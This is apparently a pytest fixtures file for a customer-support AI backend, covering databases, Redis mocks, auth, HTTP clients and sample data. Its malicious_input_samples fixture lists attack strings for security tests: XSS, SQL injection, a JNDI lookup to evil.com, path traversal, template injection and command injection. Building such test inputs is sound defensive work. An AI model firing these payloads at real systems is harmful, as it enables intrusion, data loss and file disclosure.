"""
Common test fixtures and utilities for the Customer Support AI Agent Backend.

This module provides shared fixtures for database, authentication, HTTP clients,
and other common testing utilities used across all test types.
"""

import asyncio
import os
import tempfile
import shutil
from pathlib import Path
from typing import AsyncGenerator, Dict, Any, Generator, Optional
from unittest.mock import AsyncMock, MagicMock
import pytest
import pytest_asyncio
from fastapi.testclient import TestClient
from httpx import AsyncClient, AsyncHTTPTransport
from sqlalchemy import create_engine, event
from sqlalchemy.engine import Engine
from sqlalchemy.orm import sessionmaker, Session
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
import redis.asyncio as redis
import json
import uuid
from datetime import datetime, timedelta

# Import application modules
from app.main import app
from app.database import Base, get_db_session, AsyncSessionLocal
from app.config import settings
from app.dependencies import get_redis_client, get_current_user
from app.models import User, Session as UserSession, Message, Agent, File
from app.security.security_validator import security_validator

# Import test utilities
from tests.utils.test_data_generator import TestDataGenerator
from tests.utils.mock_services import MockExternalServices
from tests.utils.auth_helpers import AuthHelpers
from tests.utils.db_helpers import DatabaseHelpers


# ==============================================================================
# DATABASE FIXTURES
# ==============================================================================

@pytest.fixture(scope="session")
def test_db_url() -> str:
    """Create a test database URL using SQLite."""
    return "sqlite:///./test_backend.db"


@pytest.fixture(scope="session") 
def engine(test_db_url):
    """Create SQLAlchemy engine for testing."""
    # Enable SQLite foreign keys
    @event.listens_for(Engine, "connect")
    def set_sqlite_pragma(dbapi_connection, connection_record):
        cursor = dbapi_connection.cursor()
        cursor.execute("PRAGMA foreign_keys=ON")
        cursor.close()
    
    engine = create_engine(test_db_url, echo=False)
    yield engine
    engine.dispose()


@pytest.fixture(scope="session")
def TestingSessionLocal(engine):
    """Create test session factory."""
    return sessionmaker(autocommit=False, autoflush=False, bind=engine)


@pytest.fixture(scope="function")
def db_session(engine, TestingSessionLocal):
    """Create a database session for testing."""
    connection = engine.connect()
    transaction = connection.begin()
    session = TestingSessionLocal(bind=connection)
    
    yield session
    
    session.close()
    transaction.rollback()
    connection.close()


@pytest.fixture(scope="function")
async def async_db_session(test_db_url):
    """Create an async database session for testing."""
    # Create async engine
    async_engine = create_async_engine(
        "sqlite+aiosqlite:///./test_backend_async.db",
        echo=False,
        future=True
    )
    
    # Create tables
    async with async_engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)
    
    # Create session factory
    async_session = async_sessionmaker(
        async_engine, 
        class_=AsyncSession, 
        expire_on_commit=False
    )
    
    # Create session
    async with async_session() as session:
        yield session
    
    # Cleanup
    await async_session.close()
    await async_engine.dispose()
    
    # Remove test database file
    test_db_path = Path("./test_backend_async.db")
    if test_db_path.exists():
        test_db_path.unlink()


# ==============================================================================
# REDIS FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
async def redis_client():
    """Create a Redis client for testing."""
    try:
        # Create a Redis client for testing (use Redis if available, otherwise mock)
        client = await redis.from_url(
            "redis://localhost:6379/15",  # Use database 15 for testing
            decode_responses=True
        )
        
        # Test connection
        await client.ping()
        yield client
        
    except (ConnectionError, OSError):
        # Redis not available, use mock
        mock_redis = MagicMock()
        mock_redis.get = AsyncMock(return_value=None)
        mock_redis.set = AsyncMock(return_value=True)
        mock_redis.delete = AsyncMock(return_value=1)
        mock_redis.exists = AsyncMock(return_value=False)
        mock_redis.ping = AsyncMock(return_value=True)
        yield mock_redis
    
    finally:
        if hasattr(client, 'close'):
            await client.close()


@pytest.fixture(scope="function")
def redis_mock():
    """Provide a mocked Redis client."""
    mock = MagicMock()
    mock.get = AsyncMock(return_value=None)
    mock.set = AsyncMock(return_value=True)
    mock.setex = AsyncMock(return_value=True)
    mock.delete = AsyncMock(return_value=1)
    mock.exists = AsyncMock(return_value=False)
    mock.keys = AsyncMock(return_value=[])
    mock.flushdb = AsyncMock(return_value=True)
    return mock


# ==============================================================================
# AUTHENTICATION FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def test_user():
    """Create a test user."""
    return {
        "id": str(uuid.uuid4()),
        "username": "testuser",
        "email": "test@example.com",
        "password": "TestPass123!",
        "is_active": True,
        "is_verified": True,
        "created_at": datetime.utcnow(),
    }


@pytest.fixture(scope="function")
def test_admin_user():
    """Create a test admin user."""
    return {
        "id": str(uuid.uuid4()),
        "username": "testadmin",
        "email": "admin@example.com", 
        "password": "AdminPass123!",
        "is_active": True,
        "is_verified": True,
        "is_admin": True,
        "created_at": datetime.utcnow(),
    }


@pytest.fixture(scope="function")
def auth_token(test_user):
    """Generate authentication token for test user."""
    # This would generate a JWT token for testing
    # For now, return a mock token
    return f"test_token_{test_user['id']}"


@pytest.fixture(scope="function")
def auth_headers(auth_token):
    """Generate authentication headers for HTTP requests."""
    return {"Authorization": f"Bearer {auth_token}"}


@pytest.fixture(scope="function")
def current_user_mock(test_user):
    """Mock current user dependency."""
    from fastapi import Depends
    
    async def get_current_user_mock():
        return test_user
    
    return get_current_user_mock


# ==============================================================================
# HTTP CLIENT FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def client() -> Generator[TestClient, None, None]:
    """Create a FastAPI test client."""
    with TestClient(app) as c:
        yield c


@pytest.fixture(scope="function") 
async def async_client() -> AsyncGenerator[AsyncClient, None]:
    """Create an async HTTP client."""
    transport = AsyncHTTPTransport(app=app)
    async with AsyncClient(transport=transport, base_url="http://testserver") as c:
        yield c


# ==============================================================================
# APPLICATION STATE FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def temp_dir():
    """Create a temporary directory for testing."""
    temp_path = Path(tempfile.mkdtemp())
    yield temp_path
    shutil.rmtree(temp_path, ignore_errors=True)


@pytest.fixture(scope="function")
def temp_file():
    """Create a temporary file for testing."""
    with tempfile.NamedTemporaryFile(mode='w', delete=False) as f:
        f.write("test content")
        f.flush()
        yield f.name
    
    # Cleanup
    try:
        os.unlink(f.name)
    except FileNotFoundError:
        pass


# ==============================================================================
# MOCK SERVICES FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def mock_openai():
    """Mock OpenAI service for testing."""
    mock = MagicMock()
    mock.chat.completions.create = AsyncMock(
        return_value=MagicMock(
            choices=[MagicMock(message=MagicMock(content="Test response"))]
        )
    )
    return mock


@pytest.fixture(scope="function") 
def mock_embedding_service():
    """Mock embedding service for testing."""
    mock = MagicMock()
    mock.embed_documents = AsyncMock(
        return_value=[[0.1, 0.2, 0.3] * 100]  # Mock 300-dimensional embedding
    )
    mock.embed_query = AsyncMock(
        return_value=[0.1, 0.2, 0.3] * 100
    )
    return mock


@pytest.fixture(scope="function")
def mock_redis_client():
    """Mock Redis client for testing."""
    mock = MagicMock()
    mock.get = AsyncMock(return_value=None)
    mock.set = AsyncMock(return_value=True)
    mock.setex = AsyncMock(return_value=True)
    mock.delete = AsyncMock(return_value=1)
    mock.exists = AsyncMock(return_value=False)
    mock.hget = AsyncMock(return_value=None)
    mock.hset = AsyncMock(return_value=1)
    mock.ping = AsyncMock(return_value=True)
    mock.close = AsyncMock(return_value=None)
    return mock


# ==============================================================================
# TEST DATA FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def sample_messages():
    """Create sample messages for testing."""
    return [
        {
            "id": str(uuid.uuid4()),
            "content": "Hello, I need help with my account",
            "message_type": "user",
            "created_at": datetime.utcnow(),
            "session_id": str(uuid.uuid4()),
            "user_id": str(uuid.uuid4()),
        },
        {
            "id": str(uuid.uuid4()),
            "content": "I'd be happy to help you with your account. What specific issue are you experiencing?",
            "message_type": "agent",
            "created_at": datetime.utcnow() + timedelta(seconds=1),
            "session_id": str(uuid.uuid4()),
            "agent_id": str(uuid.uuid4()),
        }
    ]


@pytest.fixture(scope="function")
def sample_sessions():
    """Create sample sessions for testing."""
    return [
        {
            "id": str(uuid.uuid4()),
            "user_id": str(uuid.uuid4()),
            "status": "active",
            "created_at": datetime.utcnow(),
            "updated_at": datetime.utcnow(),
        },
        {
            "id": str(uuid.uuid4()),
            "user_id": str(uuid.uuid4()),
            "status": "completed",
            "created_at": datetime.utcnow() - timedelta(hours=1),
            "updated_at": datetime.utcnow() - timedelta(minutes=30),
        }
    ]


@pytest.fixture(scope="function")
def sample_agents():
    """Create sample agents for testing."""
    return [
        {
            "id": str(uuid.uuid4()),
            "name": "Test Agent 1",
            "description": "A test agent for customer support",
            "capabilities": ["billing", "technical_support"],
            "status": "active",
            "created_at": datetime.utcnow(),
        },
        {
            "id": str(uuid.uuid4()),
            "name": "Test Agent 2", 
            "description": "Another test agent",
            "capabilities": ["general_inquiry"],
            "status": "inactive",
            "created_at": datetime.utcnow(),
        }
    ]


@pytest.fixture(scope="function")
def sample_files():
    """Create sample files for testing."""
    return [
        {
            "id": str(uuid.uuid4()),
            "filename": "test_document.pdf",
            "file_path": "/uploads/test_document.pdf",
            "file_size": 1024,
            "mime_type": "application/pdf",
            "uploaded_by": str(uuid.uuid4()),
            "created_at": datetime.utcnow(),
        },
        {
            "id": str(uuid.uuid4()),
            "filename": "test_image.png",
            "file_path": "/uploads/test_image.png",
            "file_size": 2048,
            "mime_type": "image/png",
            "uploaded_by": str(uuid.uuid4()),
            "created_at": datetime.utcnow(),
        }
    ]


# ==============================================================================
# HELPER CLASSES
# ==============================================================================

@pytest.fixture(scope="function")
def data_generator():
    """Provide test data generator."""
    return TestDataGenerator()


@pytest.fixture(scope="function")
def auth_helpers():
    """Provide authentication test helpers."""
    return AuthHelpers()


@pytest.fixture(scope="function")
def db_helpers():
    """Provide database test helpers."""
    return DatabaseHelpers()


@pytest.fixture(scope="function")
def mock_external_services():
    """Provide mock external services."""
    return MockExternalServices()


# ==============================================================================
# WEBSOCKET FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def websocket_url():
    """Provide WebSocket URL for testing."""
    return "ws://testserver/ws"


# ==============================================================================
# PERFORMANCE TEST FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def load_test_config():
    """Provide load testing configuration."""
    return {
        "concurrent_users": 10,
        "test_duration": 30,  # seconds
        "ramp_up_time": 5,    # seconds
        "target_endpoints": ["/", "/health", "/api/v1/chat/messages"],
    }


# ==============================================================================
# EVENT LOOPS AND ASYNC SETUP
# ==============================================================================

@pytest_asyncio.fixture(scope="function")
async def event_loop():
    """Create an event loop for async tests."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


# ==============================================================================
# ENVIRONMENT SETUP
# ==============================================================================

@pytest.fixture(scope="session", autouse=True)
def setup_test_environment():
    """Setup test environment variables."""
    # Set test environment
    os.environ["ENVIRONMENT"] = "testing"
    os.environ["DATABASE_URL"] = "sqlite:///./test_backend.db"
    os.environ["REDIS_HOST"] = "localhost"
    os.environ["REDIS_PORT"] = "6379"
    os.environ["REDIS_DB"] = "15"
    os.environ["SECRET_KEY"] = "test_secret_key_32_characters_long"
    os.environ["JWT_SECRET_KEY"] = "test_jwt_secret_key_32_characters_long"
    os.environ["LOG_LEVEL"] = "INFO"
    os.environ["API_HOST"] = "127.0.0.1"
    os.environ["API_PORT"] = "8000"
    
    # Create test directories
    test_dirs = [
        "tests/logs",
        "tests/tmp", 
        "tests/fixtures/data",
        "tests/reports"
    ]
    
    for dir_path in test_dirs:
        Path(dir_path).mkdir(parents=True, exist_ok=True)
    
    yield
    
    # Cleanup test environment
    # Remove test databases
    test_db_files = ["test_backend.db", "test_backend_async.db"]
    for db_file in test_db_files:
        if Path(db_file).exists():
            Path(db_file).unlink()
    
    # Remove test directories
    for dir_path in test_dirs:
        shutil.rmtree(dir_path, ignore_errors=True)


# ==============================================================================
# CLEANUP FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def cleanup_tracker():
    """Track and cleanup test resources."""
    class CleanupTracker:
        def __init__(self):
            self.resources = []
        
        def add_resource(self, resource, cleanup_func):
            self.resources.append((resource, cleanup_func))
        
        async def cleanup(self):
            for resource, cleanup_func in self.resources:
                try:
                    if asyncio.iscoroutinefunction(cleanup_func):
                        await cleanup_func(resource)
                    else:
                        cleanup_func(resource)
                except Exception as e:
                    print(f"Cleanup failed for {resource}: {e}")
    
    tracker = CleanupTracker()
    yield tracker
    
    # Auto cleanup after test
    import asyncio
    try:
        asyncio.run(tracker.cleanup())
    except Exception as e:
        print(f"Cleanup tracker error: {e}")


# ==============================================================================
# VALIDATION FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def validation_results():
    """Provide validation results for testing."""
    return {
        "valid": True,
        "violations": [],
        "sanitized_value": None,
        "security_level": "high"
    }


@pytest.fixture(scope="function")
def malicious_input_samples():
    """Provide malicious input samples for security testing."""
    return [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "${jndi:ldap://evil.com}",
        "../../etc/passwd",
        "<img src=x onerror=alert('xss')>",
        "javascript:alert('xss')",
        "{{7*7}}",  # Template injection
        "0; ls -la",  # Command injection
    ]


# ==============================================================================
# WEBSOCKET AND STREAMING FIXTURES
# ==============================================================================

@pytest.fixture(scope="function")
def websocket_messages():
    """Provide WebSocket message samples."""
    return [
        {
            "type": "chat_message",
            "content": "Hello, I need help",
            "session_id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
        },
        {
            "type": "agent_response", 
            "content": "How can I assist you today?",
            "agent_id": str(uuid.uuid4()),
            "timestamp": datetime.utcnow().isoformat(),
        },
        {
            "type": "typing_indicator",
            "session_id": str(uuid.uuid4()),
            "is_typing": True,
            "timestamp": datetime.utcnow().isoformat(),
        }
    ]


# ==============================================================================
# CONNECTION POOLS
# ==============================================================================

@pytest.fixture(scope="session")
def connection_pool_config():
    """Provide connection pool configuration for testing."""
    return {
        "database": {
            "pool_size": 5,
            "max_overflow": 10,
            "pool_timeout": 30,
            "pool_recycle": 3600,
        },
        "redis": {
            "max_connections": 20,
            "connection_timeout": 5,
            "retry_on_timeout": True,
        }
    }